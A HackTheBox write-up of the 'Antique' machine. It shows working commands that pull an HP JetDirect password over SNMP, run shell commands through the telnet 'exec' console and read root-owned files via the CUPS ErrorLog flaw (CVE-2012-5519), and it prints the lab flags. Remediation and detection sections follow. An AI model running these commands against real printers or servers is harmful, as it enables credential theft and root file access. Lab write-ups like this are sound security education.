---
layout: default
title: "HackTheBox - Antique"
---

# HackTheBox - Antique

**OS:** Linux (Ubuntu 20.04.3 LTS, posing as an HP JetDirect network printer)

Antique is a Linux machine that masquerades as an old HP network printer. The only TCP
port is 23, which is not a normal telnet login but the HP JetDirect management console,
and UDP 161 runs SNMP with the default `public` community. The JetDirect console password
is stored in the printer MIB and leaks over SNMP as a hex-encoded string; decoding it and
authenticating to the console gives an `exec` primitive that runs arbitrary shell commands
as the `lp` service account. That account belongs to the `lpadmin` group, which lets it
reconfigure the locally bound CUPS print server (running as root) to use any file as its
error log, then read that file back through the CUPS web interface, an arbitrary file read
as root (CVE-2012-5519) that hands over `root.txt`.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (antique) |
| Initial Access | SNMP `public` leaks JetDirect password -> telnet console `exec` as `lp` |
| Privilege Escalation | `lpadmin` + CUPS `ErrorLog` arbitrary file read as root (CVE-2012-5519) |
| Final Access | `root` (file read) |

---

## Recon

### Port Scan

A full TCP sweep returned a single open port, with the UDP top-100 adding SNMP. The lone
TCP service banners as telnet:

```
$ nmap -p- --min-rate 5000 10.129.24.254
PORT   STATE SERVICE
23/tcp open  telnet

$ nmap -sU --top-ports 100 10.129.24.254
PORT    STATE SERVICE
161/udp open  snmp
```

| Port | Proto | Service | Notes |
|---|---|---|---|
| 23 | TCP | telnet | HP JetDirect management console (not a login shell) |
| 161 | UDP | SNMP | SNMPv1, default `public` community |

> **Why this works:** A box whose entire attack surface is "telnet + SNMP" is almost
> always a network-device emulation (printer, switch, router). On HP printers, port 23 is
> the JetDirect admin console and SNMP exposes the device MIB, including, on misconfigured
> units, the console password itself. The two services are meant to be read together.

### SNMP Enumeration

SNMP answered to the default `public` community. HP JetDirect stores the telnet/web admin
password in a vendor MIB branch at OID `.1.3.6.1.4.1.11.2.3.9.1.1.13.0`. Querying it
directly returns the password as a `BITS`/hex string:

```
$ snmpget -v1 -c public 10.129.24.254 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 ... <remaining-bytes-redacted>
```

Each byte is an ASCII character. Decoding the hex yields the console password:

```
$ python3 -c "print(bytes.fromhex('5040 ... <redacted>').decode())"
P@***************
```

> **Why this works:** `.1.3.6.1.4.1.11` is the IANA enterprise number for Hewlett-Packard;
> `2.3.9.1.1.13.0` is the JetDirect "device password" leaf. The agent returns it to any
> reader of the `public` community with no authentication, so the device's own admin
> credential is disclosed to an unauthenticated attacker on the network. The value is the
> literal password bytes, just rendered in hex by net-snmp's `BITS` formatter.

> **Gotcha worth recording:** `snmp-check` and `snmpwalk -v2c` choke on this host's
> SNMPv1 agent (it answers v1 only and returns malformed values for a full walk). A
> targeted `snmpget -v1` against the exact OID is the reliable way to pull the one value
> that matters, rather than fighting a noisy full walk.

---

## Initial Access

### JetDirect Console -> Command Execution as `lp`

Connecting to port 23 presents the HP JetDirect banner and a password prompt. Supplying the
SNMP-leaked password drops into the JetDirect `>` console, whose `exec` verb runs an
arbitrary shell command on the underlying OS:

```
$ telnet 10.129.24.254
Trying 10.129.24.254...
Connected to 10.129.24.254.
Escape character is '^]'.

HP JetDirect

Password: P@***************

Please type "?" for HELP
> exec id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
> exec hostname
antique
```

> **Why this works:** This JetDirect emulation is a thin wrapper around a real shell. The
> `exec` command does not sanitise or restrict input, it just hands the string to the host
> OS and returns the output. Each `exec` is effectively a one-shot command run as the `lp`
> daemon account that owns the print service.

The `lp` account can read the user flag directly:

```
> exec cat /home/*/user.txt
3a78826030c5fab8e118164d82e78e1e
```

> **Tooling note:** The console is interactive and single-command-per-prompt, so each step
> was driven with a small `pexpect` wrapper that logs in once and feeds `exec <cmd>` lines,
> reading back to the `>` prompt. Commands containing shell redirection (`>`/`>&`) collide
> with that prompt match, so the file-read path below deliberately uses tools that need no
> redirection (`cupsctl`, `curl`).

---

## Post-Exploitation Enumeration

The foothold account is `lp`, and the key detail is its group membership:

```
> exec id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
> exec cat /etc/issue
Ubuntu 20.04.3 LTS
```

Membership of **`lpadmin`** is the privilege-escalation lever. `lpadmin` is the CUPS
administrative group: members are permitted to administer the CUPS print server, which on
this host runs as **root** and listens on `localhost:631`.

```
> exec curl -s http://localhost:631/ -I
HTTP/1.1 200 OK
```

> **Why this matters:** CUPS (`cupsd`) runs as root so it can bind privileged printer
> devices and write to system spool directories. Anyone in `lpadmin` can change the
> daemon's configuration through `cupsctl` and the admin web interface. One of the
> configurable values is the path of the **error log**, and CUPS will happily open and
> serve that path back, regardless of what it points to.

---

## Privilege Escalation

### CUPS `ErrorLog` Arbitrary File Read as root (CVE-2012-5519)

CVE-2012-5519 abuses the fact that a CUPS administrator can point the server's `ErrorLog`
directive at any file on disk and then download that "log" through the web interface. Since
`cupsd` reads the file as root, this is an arbitrary file read with root privileges.

Step 1, repoint the error log at the root flag:

```
> exec /usr/sbin/cupsctl ErrorLog=/root/root.txt
```

Step 2, fetch the "error log" back through the CUPS web admin endpoint:

```
> exec curl -s http://localhost:631/admin/log/error_log
9c4bffa31b4b433e19e3bf1c86837769
```

> **Why this works:** `cupsctl` writes the new `ErrorLog` value into `cupsd.conf`, which
> the running root daemon honours immediately. The `/admin/log/error_log` handler then
> streams whatever file `ErrorLog` currently names. Because the daemon opens it as root,
> file permissions on `/root/root.txt` (or `/etc/shadow`, SSH keys, etc.) are irrelevant.
> The `lpadmin` membership is the only access control in the way, and the `lp` foothold
> already satisfies it. The same two commands read any root-owned file by changing the
> `ErrorLog` target.

`root.txt` is recovered without ever needing an interactive root shell, the file-read
primitive is sufficient to own the box and could equally exfiltrate `/etc/shadow` or
`/root/.ssh/id_rsa` for a full interactive takeover.

---

## Root Cause

Antique chains three independent misconfigurations, each a self-contained failure:

1. **SNMP credential disclosure.** The default `public` community is enabled and the
   JetDirect MIB exposes the device admin password to any unauthenticated reader.
2. **Unauthenticated-to-shell management console.** The JetDirect `exec` verb provides
   arbitrary OS command execution once the (leaked) password is supplied, with no
   restriction on what may be run.
3. **Over-privileged print service + `lpadmin` foothold.** `cupsd` runs as root and trusts
   any `lpadmin` member to set `ErrorLog` to an arbitrary path and read it back
   (CVE-2012-5519). The foothold account happens to be in `lpadmin`.

Break any one link, restrict SNMP, lock down the console, or remove the file-read
primitive, and the chain to root collapses.

## Impact

Full compromise of the host. An unauthenticated attacker on the network recovers the
device password from SNMP, gains command execution as `lp`, and through the CUPS file-read
reads any root-owned file, including `/etc/shadow` and root's SSH private key, which
converts the file read into a complete interactive root takeover. Confidentiality and
integrity of the entire system are lost.

## Remediation

Recommendations are ordered by priority. The first items break the demonstrated path; the
rest are hardening.

**1. Lock down or disable SNMP (highest priority).** Do not run SNMPv1/v2c with the default
`public` community. If SNMP is required, move to SNMPv3 with authentication and privacy,
restrict the community to read-only views that exclude credential OIDs, and firewall UDP
161 to a management network only. Disable the vendor password OID exposure entirely.

**2. Change and protect the JetDirect/management password, and disable the telnet
console.** Rotate the device admin password away from a guessable value, disable the
plaintext telnet (port 23) management interface in favour of an authenticated, encrypted
channel, and never allow it to reach a general-purpose `exec` of OS commands.

**3. Remove the CUPS arbitrary-file-read exposure.** Patch CUPS to a version not affected
by CVE-2012-5519, and restrict who may reconfigure `cupsd`. Remove unnecessary accounts
from the `lpadmin` group so a low-value service account like `lp` cannot administer a
root-owned daemon. Run CUPS with the least privilege it needs rather than as full root
where the platform supports it.

**4. Apply least privilege to the print stack.** Confine `cupsd` (AppArmor/SELinux profile)
so that even an attacker who changes `ErrorLog` cannot read arbitrary system files, and
ensure configuration-change operations are logged and alerted.

### Validation

- From the attack network, confirm `snmpget -v1 -c public <ip> .1.3.6.1.4.1.11.2.3.9.1.1.13.0`
  no longer returns a value (and that `public` is rejected entirely).
- Confirm port 23 no longer presents an `exec`-capable console, or is closed.
- As an `lpadmin`-equivalent account, confirm `cupsctl ErrorLog=/etc/shadow` followed by a
  fetch of `/admin/log/error_log` no longer discloses file contents.

## Detection Opportunities

- **SNMP credential read:** SNMP GET requests against vendor password OIDs
  (`.1.3.6.1.4.1.11.2.3.9.1.1.13.0`) from non-management sources; any SNMPv1 `public`
  traffic on a network that should be SNMPv3-only.
- **JetDirect console abuse:** inbound connections to TCP 23 followed by `exec`-style
  command strings; on the host, `lp` spawning shells or running `curl`/`cupsctl`, which a
  print daemon account should never do.
- **CUPS config tampering:** writes to `cupsd.conf` (the `ErrorLog` directive changing to a
  path outside `/var/log/cups`), and CUPS process opening sensitive files such as
  `/etc/shadow` or files under `/root`. Requests to `/admin/log/error_log` for a
  non-default log path are high-fidelity.

## Lessons Learned

- **Read SNMP and the management console together.** On device-emulation boxes the SNMP
  MIB frequently holds the exact secret needed to log in to the console next to it; a
  targeted `snmpget` beats a flaky full `snmpwalk`.
- **`BITS`/hex in SNMP is often just ASCII.** Decoding the byte string with
  `bytes.fromhex(...)` turned the "encoded" value straight into the plaintext password.
- **Group membership is the privesc map.** `id` showing `lpadmin` immediately pointed at
  CUPS-as-root; the technique follows from the group, not from any binary on disk.
- **A file read as root is game over.** No shell upgrade was needed, the CUPS `ErrorLog`
  primitive reads `root.txt`, `/etc/shadow`, or root's SSH key with equal ease.

---

## Cleanup

- The CUPS `ErrorLog` directive was changed to `/root/root.txt` during exploitation and
  then **restored to its default** (`/var/log/cups/error_log`) via
  `cupsctl ErrorLog=/var/log/cups/error_log`; verified with `cupsctl | grep ErrorLog`.
- No files were written to the target; all interaction was through the JetDirect `exec`
  console and the local CUPS web interface.
- No reverse shell or implant was left behind. (An initial reverse-shell attempt on the
  attack box was abandoned because a local agent was already bound to the chosen port;
  the SNMP/console/CUPS path needs no callback, so no listener was required.)
- Attack-box loot (decoded password, notes) is retained privately only; secrets are masked
  in this writeup.
